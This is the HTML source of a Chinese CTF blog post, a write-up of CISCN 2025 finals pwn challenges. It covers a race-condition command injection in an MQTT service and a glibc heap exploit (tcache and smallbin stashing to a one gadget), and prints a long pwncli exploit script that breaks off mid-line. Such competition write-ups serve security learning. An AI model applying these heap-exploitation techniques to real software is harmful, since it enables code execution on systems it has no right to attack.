@@ -1,1 +1,1091 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="keywords" content="pwn"><meta name="author" content="InkeyP"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="canonical" href="https://blog.inkey.top/202507/23/ciscn-2025-决赛/"><meta name="robots" content="index,follow"><meta name="googlebot" content="index,follow"><meta name="revisit-after" content="1 days"><meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey."><meta property="og:type" content="article"><meta property="og:title" content="ciscn-2025-决赛"><meta property="og:url" content="https://blog.inkey.top/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/index.html"><meta property="og:site_name" content="InkeyPのblog"><meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey."><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://blog.inkey.top/images/redefine-og.webp"><meta property="article:published_time" content="2025-07-23T05:18:25.000Z"><meta property="article:modified_time" content="2025-07-23T06:17:49.213Z"><meta property="article:author" content="InkeyP"><meta property="article:tag" content="pwn"><meta property="article:tag" content="ciscn"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://blog.inkey.top/images/redefine-og.webp"><link rel="icon" type="image/png" href="/img/icon.jpg" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/img/icon.jpg"><meta name="theme-color" content="#A31F34"><link rel="shortcut icon" href="/img/icon.jpg"><title>ciscn-2025-决赛 | InkeyPのblog</title><link rel="stylesheet" href="/fonts/Chillax/chillax.css"><meta name="baidu-site-verification" content="codeva-vx7ZKBKYs0"><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/build/tailwind.css"><link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css"><link rel="stylesheet" href="/fonts/Geist/geist.css"><script id="hexo-configurations">window.config={hostname:"blog.inkey.top",root:"/",language:"zh-CN",path:"search.xml"},window.theme={articles:{style:{font_size:"16px",line_height:1.5,image_border_radius:"14px",image_alignment:"center",image_caption:!1,link_icon:!0,delete_mask:!1,title_alignment:"left",headings_top_spacing:{h1:"3.2rem",h2:"2.4rem",h3:"1.9rem",h4:"1.6rem",h5:"1.4rem",h6:"1.3rem"}},word_count:{enable:!0,count:!0,min2read:!0},author_label:{enable:!0,auto:!0,list:[]},code_block:{copy:!0,style:"mac",highlight_theme:{light:"github",dark:"vs2015"},font:{enable:!1,family:null,url:null}},toc:{enable:!0,max_depth:3,number:!1,expand:!0,init_open:!0},copyright:{enable:!0,default:"cc_by_nc_sa"},lazyload:!0,pangu_js:!0,recommendation:{enable:!0,title:"绝赞文章",limit:3,mobile_limit:2,placeholder:"/images/wallhaven-wqery6-light.webp",skip_dirs:[]}},colors:{primary:"#A31F34",secondary:null,default_mode:"dark"},global:{fonts:{chinese:{enable:!1,family:null,url:null},english:{enable:!1,family:null,url:null},title:{enable:!1,family:null,url:null}},content_max_width:"1000px",sidebar_width:"210px",hover:{shadow:!0,scale:!1},scroll_progress:{bar:!1,percentage:!0},website_counter:{url:"https://cn.vercount.one/js",enable:!0,site_pv:!0,site_uv:!0,post_pv:!0},single_page:!0,preloader:{enable:!1,custom_message:null},open_graph:{enable:!0,image:"/images/redefine-og.webp",description:"Hexo Theme Redefine, Redefine Your Hexo Journey."},google_analytics:{enable:!1,id:null}},home_banner:{enable:!0,style:"fixed",image:{light:"/img/cover/34.png",dark:"/img/index_img.png"},title:"InkeyPのblog",subtitle:{text:["可以打一辈子CTF吗"],hitokoto:{enable:!1,show_author:!1,api:"https://v1.hitokoto.cn"},typing_speed:100,backing_speed:80,starting_delay:500,backing_delay:1500,loop:!0,smart_backspace:!0},text_color:{light:"#4a3b5c",dark:"#e6f1d9"},text_style:{title_size:"2.8rem",subtitle_size:"1.5rem",line_height:1.2},custom_font:{enable:!1,family:null,url:null},social_links:{enable:!0,style:"default",links:{github:"https://github.com/InkeyP",instagram:null,zhihu:null,twitter:null,email:"1844598344@qq.com"},qrs:{weixin:null}}},plugins:{feed:{enable:!1},aplayer:{enable:!1,type:"fixed",audios:[{name:null,artist:null,url:null,cover:null,lrc:null}]},mermaid:{enable:!1,version:"11.4.1"}},version:"2.8.2",navbar:{auto_hide:!1,color:{left:"#f78736",right:"#367df7",transparency:35},width:{home:"1200px",pages:"1000px"},links:{Home:{path:"/",icon:"fa-regular fa-house"},Friends:{path:"/links",icon:"fa-regular fa-link"},About:{icon:"fa-regular fa-user",submenus:{Me:"/about"}}},search:{enable:!0,preload:!0}},page_templates:{friends_column:2,tags_style:"blur"},home:{sidebar:{enable:!0,position:"left",first_item:"menu",announcement:null,show_on_mobile:!0,links:{Archives:{path:"/archives",icon:"fa-regular fa-archive"},Tags:{path:"/tags",icon:"fa-regular fa-tags"},Categories:{path:"/categories",icon:"fa-regular fa-folder"}}},article_date_format:"auto",excerpt_length:200,categories:{enable:!1,limit:3},tags:{enable:!1,limit:3}},footerStart:"2024/11/29 11:45:14"},window.lang_ago={second:"%s 秒前",minute:"%s 分钟前",hour:"%s 小时前",day:"%s 天前",week:"%s 周前",month:"%s 个月前",year:"%s 年前"},window.data={masonry:!1}</script><link rel="stylesheet" href="/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/fontawesome/brands.min.css"><link rel="stylesheet" href="/fontawesome/solid.min.css"><link rel="stylesheet" href="/fontawesome/regular.min.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div class="progress-bar-container"><span class="pjax-progress-bar"></span></div><main class="page-container" id="swup"><div class="main-content-container flex flex-col justify-between min-h-dvh"><div class="main-content-header"><header class="navbar-container px-6 md:px-12"><div class="navbar-content transition-navbar"><div class="left"><a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/"><img src="/img/icon.jpg" class="w-full h-full rounded-sm"> </a><a class="logo-title" href="/">InkeyPのblog</a></div><div class="right"><div class="desktop"><ul class="navbar-list"><li class="navbar-item"><a href="/"><i class="fa-regular fa-house fa-fw"></i> 首页</a></li><li class="navbar-item"><a href="/links"><i class="fa-regular fa-link fa-fw"></i> 友情链接</a></li><li class="navbar-item"><a class="has-dropdown" href="#" onclick="&#34;return" false;&#34;><i class="fa-regular fa-user fa-fw"></i> 关于 <i class="fa-solid fa-chevron-down fa-fw"></i></a><ul class="sub-menu"><li><a href="/about">ME</a></li></ul></li><li class="navbar-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div><div class="icon-item navbar-bar"><div class="navbar-bar-middle"></div></div></div></div></div><div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between"><ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start"><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/"><span>首页 </span><i class="fa-regular fa-house fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/links"><span>友情链接 </span><i class="fa-regular fa-link fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full"><div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" navbar-data-toggle="submenu-About"><span>关于 </span><i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i></div><div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About"><div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl"><a class="text-third-text-color text-xl" href="/about">ME</a></div></div></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active" href="/archives"><span>Archives</span> <i class="fa-regular fa-archive fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active" href="/tags"><span>Tags</span> <i class="fa-regular fa-tags fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active" href="/categories"><span>Categories</span> <i class="fa-regular fa-folder fa-sm fa-fw"></i></a></li></ul><div class="statistics flex justify-around my-2.5"><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">18</div><div class="label text-third-text-color text-sm">标签</div></a><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div><div class="label text-third-text-color text-sm">分类</div></a><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">22</div><div class="label text-third-text-color text-sm">文章</div></a></div></div><div class="window-mask"></div></header></div><div class="main-content-body transition-fade-up"><div class="main-content"><div class="post-page-container flex relative justify-between box-border w-full h-full"><div class="article-content-container"><div class="article-title relative w-full"><img src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/1.jpg" alt="ciscn-2025-决赛" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"><div class="w-full flex items-center absolute bottom-0 justify-start"><h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color">ciscn-2025-决赛</h1></div></div><div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8"><div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]"><img src="https://avatars.githubusercontent.com/u/39005478?s=800"></div><div class="info flex flex-col justify-between"><div class="author flex items-center"><span class="name text-default-text-color text-lg font-semibold">InkeyP</span> <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-pen-fancy"></i>&nbsp; <span class="desktop">2025-07-23 13:18:25</span> <span class="mobile">2025-07-23 13:18:25</span> <span class="hover-info">创建</span> </span><span class="article-date article-meta-item"><i class="fa-regular fa-wrench"></i>&nbsp; <span class="desktop">2025-07-23 14:17:49</span> <span class="mobile">2025-07-23 14:17:49</span> <span class="hover-info">更新</span> </span><span class="article-categories article-meta-item"><i class="fa-regular fa-folders"></i>&nbsp;<ul><li><a href="/categories/pwn/">pwn</a>&nbsp;</li></ul></span><span class="article-tags article-meta-item"><i class="fa-regular fa-tags"></i>&nbsp;<ul><li><a href="/tags/pwn/">pwn</a>&nbsp;</li><li>| <a href="/tags/ciscn/">ciscn</a>&nbsp;</li></ul></span><span class="article-wordcount article-meta-item"><i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.7k 字</span> </span><span class="article-min2read article-meta-item"><i class="fa-regular fa-clock"></i>&nbsp;<span>8 分钟</span> </span><span class="article-pv article-meta-item"><i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8"><h1 id="Ciscn-2025-决赛-PWN"><a href="#Ciscn-2025-决赛-PWN" class="headerlink" title="Ciscn 2025 决赛 PWN"></a>Ciscn 2025 决赛 PWN</h1><h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h2><h3 id="mqtt"><a href="#mqtt" class="headerlink" title="mqtt"></a>mqtt</h3><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723132403510.png" title="image-20250723132403510"><p>存在命令注入，但是需要绕过必须为字母数字的check</p><p>注意到程序有<code>sleep(2)</code>而且为多线程，因此这里是条件竞争</p><p>先输入合法vin，再进行命令注入</p><h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><p>使用mqttx订阅<code>diag</code>，得到<code>VIN</code>，计算得到<code>auth</code></p><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> a1[] = <span class="string">&quot;111111111a&quot;</span>;</span><br><span class="line">    <span class="type">int</span> v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; a1[i]; ++i)</span><br><span class="line">        v3 = <span class="number">31</span> * v3 + *(<span class="type">char</span>*)(i + a1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%08x\n&quot;</span>, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>然后发送</p><img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250719113706904.png" title="image-20250719113706904"> <img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250719113455689.png" title="image-20250719113455689"><h2 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h2><h3 id="DarkHeap"><a href="#DarkHeap" class="headerlink" title="DarkHeap"></a>DarkHeap</h3><h4 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h4><p>无泄漏UAF</p><p>以下exp来自Tplus师傅🥰(tqllll)</p><p>源码</p><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">    stash them in the tcache.  */</span></span><br><span class="line"> <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line"> <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">   &#123;</span><br><span class="line">     mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">     <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;  <span class="comment">// 这里会将地址写入</span></span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">           &#125;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div><p>首先</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">7</span>, <span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x118</span>)</span><br></pre></td></tr></table></figure></div><p>在tcache_struct留下标志位</p><p>然后分配0x88大小chunk，填满tcache和smallbin</p><p>修改smallbins第七个chunk的bk位，使其指向tcache_struct的0x100链表位置</p><p>再申请8个0x88大小的chunk，触发smallbin reverse into tcache</p><p>这样，tcache_struct的0x100链表位置就会链入0x90的tcache链表</p><img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723135122192.png" title="image-20250723135122192"><p>如法炮制，这次修改smallbins第八个chunk的bk位，使其指向tcache_struct的0x120链表位置</p><p>再申请8个0x88大小的chunk，触发smallbin reverse into tcache</p><p>这样，libc地址就会写入tcache_struct的0x120链表位置</p><img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723135256329.png" title="image-20250723135256329"><p>接着就是申请0x88，修改0x120的低位，指向libc got，改为one gadget，触发报错</p><img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723135407773.png" title="image-20250723135407773"><p><strong>无爆破版！！！！</strong></p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;130&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    set follow-fork child</span></span><br><span class="line"><span class="string">    brva 0x1483</span></span><br><span class="line"><span class="string">    brva 0x15A6</span></span><br><span class="line"><span class="string">    brva 0x154F</span></span><br><span class="line"><span class="string">    brva 0x165A</span></span><br><span class="line"><span class="string">    b malloc.c:3932</span></span><br><span class="line"><span class="string">    set $heap = $rebase(0x40A0)</span></span><br><span class="line"><span class="string">    dir /mnt/f/Documents/CTF/glibc/glibc-2.35</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gift.elf = ELF(elf_path := <span class="string">&#x27;./DarkHeap_patch&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    ip, port = re.split(<span class="string">r&#x27;[\s:]+&#x27;</span>, addr)</span><br><span class="line">    gift.io = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(elf_path)</span><br><span class="line">    <span class="comment"># gift.io = gdb.debug(elf_path, gdbscript=cmd, sysroot=&#x27;/&#x27;)</span></span><br><span class="line">gift.remote = local_flag <span class="keyword">in</span> (<span class="string">&quot;remote&quot;</span>, <span class="string">&quot;nodbg&quot;</span>)</span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc()</span><br><span class="line"></span><br><span class="line">IAT = <span class="string">b&#x27;Choice:&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    sla(IAT, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;Size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(IAT, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">    sla(IAT, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">b&#x27;Content&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># launch_gdb(cmd)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x118</span>)</span><br><span class="line">heap_base = get_current_heapbase_addr()</span><br><span class="line">libc_base = get_current_libcbase_addr()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x88</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, <span class="number">15</span>):</span><br><span class="line">    add(i, <span class="number">0x88</span>)</span><br><span class="line">    add(<span class="number">0xF</span>, <span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x4F8</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xB8</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x500</span> - <span class="number">0xC0</span> - <span class="number">8</span>)</span><br><span class="line">edit(</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0xB8</span>: <span class="number">0x91</span>,</span><br><span class="line">            <span class="number">0xB8</span> + <span class="number">0x90</span>: <span class="number">0x91</span>,</span><br><span class="line">            <span class="number">0xB8</span> + <span class="number">0x90</span> * <span class="number">2</span>: <span class="number">0x91</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">    ),</span><br><span class="line">)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xF</span>, <span class="number">0x1500</span>)  <span class="comment"># put last unsorted into small</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x1500</span>)  <span class="comment"># align</span></span><br><span class="line">dele(<span class="number">0xF</span>)</span><br><span class="line">edit(<span class="number">0xD</span>, p64(<span class="number">0</span>) + p16((heap_base &amp; <span class="number">0xFFFF</span>) + <span class="number">0x90</span> + <span class="number">8</span> * (<span class="number">0x100</span> - <span class="number">0x20</span>) // <span class="number">16</span> - <span class="number">0x10</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i, <span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x98</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, <span class="number">15</span>):</span><br><span class="line">    add(i, <span class="number">0x98</span>)</span><br><span class="line">    add(<span class="number">0xF</span>, <span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x4F8</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xB8</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x500</span> - <span class="number">0xC0</span> - <span class="number">8</span>)</span><br><span class="line">edit(</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0xB8</span>: <span class="number">0xA1</span>,</span><br><span class="line">            <span class="number">0xB8</span> + <span class="number">0xA0</span>: <span class="number">0xA1</span>,</span><br><span class="line">            <span class="number">0xB8</span> + <span class="number">0xA0</span> * <span class="number">2</span>: <span class="number">0xA1</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">    ),</span><br><span class="line">)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xF</span>, <span class="number">0x128</span>)  <span class="comment"># put last unsorted into small</span></span><br><span class="line">edit(<span class="number">0xE</span>, p64(<span class="number">0</span>) + p16((heap_base &amp; <span class="number">0xFFFF</span>) + <span class="number">0x90</span> + <span class="number">8</span> * (<span class="number">0x120</span> - <span class="number">0x20</span>) // <span class="number">16</span> - <span class="number">0x10</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i, <span class="number">0x98</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x88</span>)</span><br><span class="line"><span class="comment"># edit(0, p64(0) * 2 + p32(libc.sym._IO_2_1_stdout_ &amp; 0xFFFF))</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p32((libc_base + <span class="number">0x21A080</span>) &amp; <span 